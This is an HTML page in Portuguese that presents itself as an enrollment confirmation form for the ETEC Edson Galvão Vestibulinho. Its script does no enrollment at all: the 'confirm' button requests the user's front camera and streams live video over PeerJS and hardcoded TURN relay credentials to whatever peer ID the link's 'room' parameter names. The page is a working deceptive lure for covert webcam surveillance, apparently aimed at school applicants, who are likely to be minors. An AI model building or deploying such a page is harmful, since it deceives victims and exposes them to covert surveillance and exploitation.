
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Confirmar inscrição - ETEC Edson Galvão</title>
<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
<style>
* { box-sizing: border-box; }
body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #f3f4f6;
    font-family: Arial, sans-serif;
}
.container {
    width: 90%;
    max-width: 420px;
    background: white;
    padding: 30px 20px;
    border-radius: 12px;
    text-align: center;
    box-shadow: 0 3px 15px #0002;
}
button {
    width: 100%;
    padding: 20px 10px;
    background: #176b3a;
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 18px;
    font-weight: bold;
}
button:disabled { opacity: .6; }
#status { margin-top: 20px; line-height: 1.5; }
</style>
</head>
<body>
<div class="container">
    <h2>ETEC Edson Galvão</h2>
    <p>Confirme sua inscrição para o Vestibulinho.</p>
    <button id="confirmar">CONFIRMAR INSCRIÇÃO</button>
    <div id="status">Aguardando sua confirmação.</div>
</div>

<script>
const botao = document.getElementById("confirmar");
const statusEl = document.getElementById("status");

const sala = new URLSearchParams(location.search).get("room");

const iceServers = [
    { urls: "stun:stun.relay.metered.ca:80" },
    {
        urls: "turn:global.relay.metered.ca:80",
        username: "4882d2f9ee2cf85b5898869a",
        credential: "4mlHb03re3WB2QSf"
    },
    {
        urls: "turn:global.relay.metered.ca:80?transport=tcp",
        username: "4882d2f9ee2cf85b5898869a",
        credential: "4mlHb03re3WB2QSf"
    },
    {
        urls: "turn:global.relay.metered.ca:443",
        username: "4882d2f9ee2cf85b5898869a",
        credential: "4mlHb03re3WB2QSf"
    },
    {
        urls: "turns:global.relay.metered.ca:443?transport=tcp",
        username: "4882d2f9ee2cf85b5898869a",
        credential: "4mlHb03re3WB2QSf"
    }
];

let peer = null;
let stream = null;
let chamada = null;

function mensagem(texto) {
    statusEl.textContent = texto;
}

botao.addEventListener("click", async function() {
    if (!sala) {
        mensagem("Convite inválido. Solicite um novo link.");
        return;
    }

    botao.disabled = true;
    botao.textContent = "INICIANDO CÂMERA...";

    try {
        mensagem("Solicitando autorização da câmera...");

        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });

        mensagem("Câmera autorizada. Conectando ao painel...");

        peer = new Peer({
            config: {
                iceServers: iceServers
            }
        });

        peer.on("open", function() {
            chamada = peer.call(sala, stream);

            if (!chamada) {
                mensagem("Não foi possível iniciar a transmissão.");
                botao.disabled = false;
                return;
            }

            botao.textContent = "INSCRIÇÃO ENVIADA";
            mensagem("Câmera ativa. Aguardando confirmação do painel.");

            chamada.on("close", function() {
                mensagem("Conexão encerrada.");
            });

            chamada.on("error", function() {
                mensagem("Erro na transmissão. Tente novamente.");
            });
        });

        peer.on("error", function(erro) {
            mensagem("Erro de conexão: " + erro.type);
            botao.disabled = false;
            botao.textContent = "TENTAR NOVAMENTE";
        });

    } catch (erro) {
        let texto = erro.message;

        if (erro.name === "NotAllowedError") {
            texto = "Permita o acesso à câmera no navegador.";
        } else if (erro.name === "NotFoundError") {
            texto = "Nenhuma câmera encontrada.";
        } else if (erro.name === "NotReadableError") {
            texto = "A câmera está sendo usada por outro aplicativo.";
        }

        mensagem(texto);
        botao.disabled = false;
        botao.textContent = "TENTAR NOVAMENTE";
    }
});
</script>
</body>
</html>
